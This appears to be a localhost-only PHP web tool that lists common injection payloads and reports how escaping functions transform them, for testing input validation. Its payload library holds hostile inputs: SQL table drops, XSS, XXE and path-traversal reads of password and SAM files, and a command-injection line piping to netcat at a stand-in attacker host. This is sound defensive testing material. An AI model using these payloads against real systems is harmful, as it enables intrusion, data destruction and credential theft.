<?php
/**
 * ============================================================================
 * FORM FUZZER - Test Input Fields for Vulnerabilities
 * ============================================================================
 * 
 * Interactive tool to test form fields for:
 * - SQL Injection
 * - XSS Payloads
 * - Path Traversal
 * - Buffer Overflow patterns
 * - Special characters handling
 * ============================================================================
 */

// Localhost only
if (!in_array($_SERVER['HTTP_HOST'], ['localhost', '127.0.0.1'])) {
    die("Access Denied");
}

session_start();

$test_mode = $_GET['test'] ?? 'view';
$test_results = [];

// Fuzz Payloads Library
$fuzz_payloads = [
    'sql_injection' => [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "1' UNION SELECT NULL,NULL,NULL --",
        "admin' --",
        "1' AND SLEEP(5) --",
        "1' AND '1'='1",
        "' OR 1=1 --",
        "' /*",
        "') OR ('1'='1",
    ],
    'xss' => [
        '<script>alert("XSS")</script>',
        '<img src=x onerror="alert(\'XSS\')">',
        '<svg onload="alert(\'XSS\')">',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<body onload="alert(\'XSS\')">',
        '<input onfocus="alert(\'XSS\')" autofocus>',
        '<marquee onstart="alert(\'XSS\')"></marquee>',
        '<audio src=x onerror="alert(\'XSS\')"></audio>',
    ],
    'path_traversal' => [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        'files/../../../../etc/passwd',
        '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '....//....//....//etc/passwd',
        'file:///etc/passwd',
    ],
    'command_injection' => [
        '; ls',
        '| whoami',
        '`id`',
        '$(whoami)',
        '; cat /etc/passwd',
        '| nc attacker.com 1234',
    ],
    'ldap_injection' => [
        '*',
        '*)(uid=*',
        '*)(|(uid=*',
        '*))(&(uid=*',
    ],
    'xml_injection' => [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><foo>&xxe;</foo>',
    ],
];

// Test validator against payloads
function test_payload($payload, $validator_function = null) {
    $results = [
        'payload' => $payload,
        'length' => strlen($payload),
        'tests' => []
    ];

    // Test 1: htmlspecialchars
    $escaped_html = htmlspecialchars($payload, ENT_QUOTES, 'UTF-8');
    $results['tests']['htmlspecialchars'] = [
        'protected' => ($escaped_html !== $payload),
        'output' => substr($escaped_html, 0, 50) . (strlen($escaped_html) > 50 ? '...' : '')
    ];

    // Test 2: HTML entity encode
    $encoded = htmlentities($payload, ENT_QUOTES, 'UTF-8');
    $results['tests']['htmlentities'] = [
        'protected' => ($encoded !== $payload),
        'output' => substr($encoded, 0, 50) . (strlen($encoded) > 50 ? '...' : '')
    ];

    // Test 3: URL encode
    $urlencoded = urlencode($payload);
    $results['tests']['urlencode'] = [
        'protected' => ($urlencoded !== $payload),
        'output' => substr($urlencoded, 0, 50) . (strlen($urlencoded) > 50 ? '...' : '')
    ];

    // Test 4: Strip tags
    $stripped = strip_tags($payload);
    $results['tests']['strip_tags'] = [
        'protected' => ($stripped !== $payload),
        'output' => substr($stripped, 0, 50) . (strlen($stripped) > 50 ? '...' : '')
    ];

    // Test 5: Regex pattern (basic SQL injection check)
    $sql_pattern = '/(\s|^)(UNION|SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|EXECUTE)\s/i';
    $results['tests']['sql_pattern'] = [
        'matched' => (bool)preg_match($sql_pattern, $payload),
        'description' => 'Detects SQL keywords'
    ];

    return $results;
}

// Handle test requests
if ($test_mode === 'test_sql') {
    header('Content-Type: application/json');
    $test_results = [];
    foreach ($fuzz_payloads['sql_injection'] as $payload) {
        $test_results[] = test_payload($payload);
    }
    echo json_encode($test_results);
    exit;
}

if ($test_mode === 'test_xss') {
    header('Content-Type: application/json');
    $test_results = [];
    foreach ($fuzz_payloads['xss'] as $payload) {
        $test_results[] = test_payload($payload);
    }
    echo json_encode($test_results);
    exit;
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>Form Fuzzer - Input Validation Tester</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
            padding: 20px;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            border-radius: 10px;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .header h1 { font-size: 32px; margin-bottom: 10px; }

        .tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 30px;
            flex-wrap: wrap;
        }
        .tab-btn {
            padding: 12px 24px;
            background: white;
            border: 2px solid #ddd;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
        }
        .tab-btn:hover { border-color: #667eea; }
        .tab-btn.active { 
            background: #667eea;
            color: white;
            border-color: #667eea;
        }

        .tab-content {
            display: none;
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .tab-content.active { display: block; }

        .payload-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .payload-card {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
        }
        .payload-card h3 { margin-bottom: 10px; color: #333; }
        .payload-list {
            max-height: 300px;
            overflow-y: auto;
        }
        .payload-item {
            background: white;
            padding: 10px;
            margin: 5px 0;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            word-break: break-all;
            border-left: 3px solid #e9ecef;
            cursor: pointer;
            transition: all 0.3s;
        }
        .payload-item:hover {
            border-left-color: #667eea;
            background: #f0f0f0;
        }

        .test-section {
            margin: 30px 0;
        }
        .test-section h2 {
            color: #333;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid #e9ecef;
        }

        .input-tester {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        .input-group {
            margin-bottom: 15px;
        }
        .input-group label {
            display: block;
            font-weight: bold;
            margin-bottom: 8px;
            color: #333;
        }
        .input-group input,
        .input-group textarea {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
        }
        .input-group textarea { resize: vertical; min-height: 100px; }

        .button-group {
            display: flex;
            gap: 10px;
            margin: 20px 0;
        }
        button {
            padding: 12px 24px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
        }
        button:hover { background: #764ba2; }

        .test-result {
            background: white;
            padding: 15px;
            margin: 15px 0;
            border-radius: 8px;
            border-left: 4px solid #6bcf7f;
        }
        .test-result.vulnerable {
            border-left-color: #ff4757;
            background: #fff5f5;
        }

        .result-item {
            margin: 10px 0;
            padding: 10px;
            background: #f8f9fa;
            border-radius: 4px;
        }
        .result-item strong { color: #667eea; }

        .code-block {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 15px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            overflow-x: auto;
            margin: 10px 0;
        }

        .chart { margin: 30px 0; }
        .bar {
            display: flex;
            align-items: center;
            margin: 10px 0;
        }
        .bar-label { width: 150px; font-weight: bold; }
        .bar-fill {
            height: 30px;
            background: linear-gradient(90deg, #667eea, #764ba2);
            border-radius: 4px;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            min-width: 40px;
            margin: 0 10px;
        }

        .loading { 
            text-align: center; 
            color: #667eea; 
            font-weight: bold;
            padding: 20px;
        }

        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @media (max-width: 768px) {
            .payload-grid { grid-template-columns: 1fr; }
            .tabs { flex-direction: column; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Form Fuzzer & Input Validator</h1>
            <div style="opacity: 0.9;">Test input fields for security vulnerabilities</div>
        </div>

        <div class="tabs">
            <button class="tab-btn active" onclick="switchTab('payloads')">Payload Library</button>
            <button class="tab-btn" onclick="switchTab('tester')">Manual Tester</button>
            <button class="tab-btn" onclick="switchTab('sql')">SQL Injection Tests</button>
            <button class="tab-btn" onclick="switchTab('xss')">XSS Vulnerability Tests</button>
        </div>

        <!-- Tab 1: Payload Library -->
        <div id="payloads" class="tab-content active">
            <h2>Common Fuzzing Payloads</h2>
            <p style="color: #666; margin-bottom: 20px;">Click on any payload to copy it to clipboard</p>
            
            <div class="payload-grid">
                <div class="payload-card">
                    <h3>SQL Injection</h3>
                    <div class="payload-list">
                        <?php foreach ($fuzz_payloads['sql_injection'] as $payload): ?>
                            <div class="payload-item" onclick="copyToClipboard(this)">
                                <?php echo htmlspecialchars($payload); ?>
                            </div>
                        <?php endforeach; ?>
                    </div>
                </div>

                <div class="payload-card">
                    <h3>XSS Payloads</h3>
                    <div class="payload-list">
                        <?php foreach ($fuzz_payloads['xss'] as $payload): ?>
                            <div class="payload-item" onclick="copyToClipboard(this)">
                                <?php echo htmlspecialchars($payload); ?>
                            </div>
                        <?php endforeach; ?>
                    </div>
                </div>

                <div class="payload-card">
                    <h3>Path Traversal</h3>
                    <div class="payload-list">
                        <?php foreach ($fuzz_payloads['path_traversal'] as $payload): ?>
                            <div class="payload-item" onclick="copyToClipboard(this)">
                                <?php echo htmlspecialchars($payload); ?>
                            </div>
                        <?php endforeach; ?>
                    </div>
                </div>

                <div class="payload-card">
                    <h3>Command Injection</h3>
                    <div class="payload-list">
                        <?php foreach ($fuzz_payloads['command_injection'] as $payload): ?>
                            <div class="payload-item" onclick="copyToClipboard(this)">
                                <?php echo htmlspecialchars($payload); ?>
                            </div>
                        <?php endforeach; ?>
                    </div>
                </div>
            </div>
        </div>

        <!-- Tab 2: Manual Tester -->
        <div id="tester" class="tab-content">
            <h2>Manual Input Validation Tester</h2>
            
            <div class="input-tester">
                <form id="manual-test-form">
                    <div class="input-group">
                        <label>Test Input:</label>
                        <textarea id="manual-input" placeholder="Enter test payload here..."></textarea>
                    </div>

                    <div class="input-group">
                        <label>Validator Type:</label>
                        <select id="validator-type" style="padding: 10px; border: 1px solid #ddd; border-radius: 4px; width: 100%;">
                            <option value="xss">XSS / Output Encoding</option>
                            <option value="sql">SQL Injection Patterns</option>
                            <option value="url">URL Encoding</option>
                            <option value="html">HTML Entity Encoding</option>
                        </select>
                    </div>

                    <div class="button-group">
                        <button type="button" onclick="testManualInput()">Test Input</button>
                        <button type="button" onclick="clearTest()">Clear</button>
                    </div>
                </form>
            </div>

            <div id="manual-results"></div>
        </div>

        <!-- Tab 3: SQL Injection Tests -->
        <div id="sql" class="tab-content">
            <h2>SQL Injection Vulnerability Detection</h2>
            
            <div class="button-group">
                <button onclick="runSQLTests()">Run SQL Injection Tests</button>
            </div>

            <div id="sql-results"></div>
        </div>

        <!-- Tab 4: XSS Tests -->
        <div id="xss" class="tab-content">
            <h2>Cross-Site Scripting (XSS) Detection</h2>
            
            <div class="button-group">
                <button onclick="runXSSTests()">Run XSS Tests</button>
            </div>

            <div id="xss-results"></div>
        </div>
    </div>

    <script>
        function switchTab(tabName) {
            // Hide all tabs
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            document.querySelectorAll('.tab-btn').forEach(btn => {
                btn.classList.remove('active');
            });

            // Show selected tab
            document.getElementById(tabName).classList.add('active');
            event.target.classList.add('active');
        }

        function copyToClipboard(element) {
            const text = element.textContent;
            navigator.clipboard.writeText(text).then(() => {
                const originalColor = element.style.background;
                element.style.background = '#6bcf7f';
                element.style.color = 'white';
                setTimeout(() => {
                    element.style.background = originalColor;
                    element.style.color = '';
                }, 1000);
            });
        }

        function testManualInput() {
            const input = document.getElementById('manual-input').value;
            const validatorType = document.getElementById('validator-type').value;
            const resultsDiv = document.getElementById('manual-results');

            if (!input.trim()) {
                resultsDiv.innerHTML = '<div class="test-result vulnerable">Please enter a test input</div>';
                return;
            }

            let html = '<div class="test-result">';
            html += '<h3>Test Results</h3>';
            html += '<p><strong>Input:</strong></p>';
            html += '<div class="code-block">' + escapeHtml(input) + '</div>';

            // Perform different tests based on validator type
            if (validatorType === 'xss') {
                const htmlSpecialChars = escapeHtml(input);
                html += '<div class="result-item">';
                html += '<strong>htmlspecialchars() Output:</strong><br>';
                html += '<div class="code-block">' + htmlSpecialChars + '</div>';
                html += '<p><strong>Protected:</strong> ' + (htmlSpecialChars !== input ? 'YES ✓' : 'NO ✗') + '</p>';
                html += '</div>';
            } else if (validatorType === 'sql') {
                const sqlPattern = /(\s|^)(UNION|SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|EXECUTE)\s/i;
                const hasSQL = sqlPattern.test(input);
                html += '<div class="result-item">';
                html += '<strong>SQL Keywords Detected:</strong> ' + (hasSQL ? 'YES ✗' : 'NO ✓') + '<br>';
                html += '</div>';
            }

            html += '</div>';
            resultsDiv.innerHTML = html;
        }

        function runSQLTests() {
            const resultsDiv = document.getElementById('sql-results');
            resultsDiv.innerHTML = '<div class="loading"><div class="spinner"></div>Running SQL Injection Tests...</div>';

            fetch('?test=test_sql')
                .then(r => r.json())
                .then(data => {
                    let html = '';
                    data.forEach(test => {
                        html += '<div class="test-result">';
                        html += '<h3>Payload: ' + htmlspecialchars(test.payload) + '</h3>';
                        html += '<p>Length: ' + test.length + ' chars</p>';
                        
                        html += '<h4>Protection Tests:</h4>';
                        Object.entries(test.tests).forEach(([method, result]) => {
                            if (result.protected !== undefined) {
                                html += '<div class="result-item">';
                                html += '<strong>' + method + ':</strong> ' + (result.protected ? 'PROTECTED ✓' : 'VULNERABLE ✗') + '<br>';
                                if (result.output) {
                                    html += '<small>Output: ' + result.output + '</small>';
                                }
                                html += '</div>';
                            } else if (result.matched !== undefined) {
                                html += '<div class="result-item">';
                                html += '<strong>' + method + ':</strong> ' + (result.matched ? 'DETECTED' : 'NOT DETECTED') + '<br>';
                                if (result.description) {
                                    html += '<small>' + result.description + '</small>';
                                }
                                html += '</div>';
                            }
                        });
                        
                        html += '</div>';
                    });
                    resultsDiv.innerHTML = html;
                })
                .catch(err => {
                    resultsDiv.innerHTML = '<div class="test-result vulnerable">Error: ' + err + '</div>';
                });
        }

        function runXSSTests() {
            const resultsDiv = document.getElementById('xss-results');
            resultsDiv.innerHTML = '<div class="loading"><div class="spinner"></div>Running XSS Tests...</div>';

            fetch('?test=test_xss')
                .then(r => r.json())
                .then(data => {
                    let html = '';
                    data.forEach(test => {
                        html += '<div class="test-result">';
                        html += '<h3>Payload: ' + htmlspecialchars(test.payload) + '</h3>';
                        html += '<p>Length: ' + test.length + ' chars</p>';
                        
                        html += '<h4>Protection Tests:</h4>';
                        Object.entries(test.tests).forEach(([method, result]) => {
                            if (result.protected !== undefined) {
                                html += '<div class="result-item">';
                                html += '<strong>' + method + ':</strong> ' + (result.protected ? 'PROTECTED ✓' : 'VULNERABLE ✗') + '<br>';
                                if (result.output) {
                                    html += '<small>Output: ' + escapeHtml(result.output) + '</small>';
                                }
                                html += '</div>';
                            }
                        });
                        
                        html += '</div>';
                    });
                    resultsDiv.innerHTML = html;
                })
                .catch(err => {
                    resultsDiv.innerHTML = '<div class="test-result vulnerable">Error: ' + err + '</div>';
                });
        }

        function escapeHtml(text) {
            const map = {
                '&': '&amp;',
                '<': '&lt;',
                '>': '&gt;',
                '"': '&quot;',
                "'": '&#039;'
            };
            return text.replace(/[&<>"']/g, m => map[m]);
        }

        function htmlspecialchars(text) {
            return escapeHtml(text);
        }

        function clearTest() {
            document.getElementById('manual-input').value = '';
            document.getElementById('manual-results').innerHTML = '';
        }
    </script>
</body>
</html>
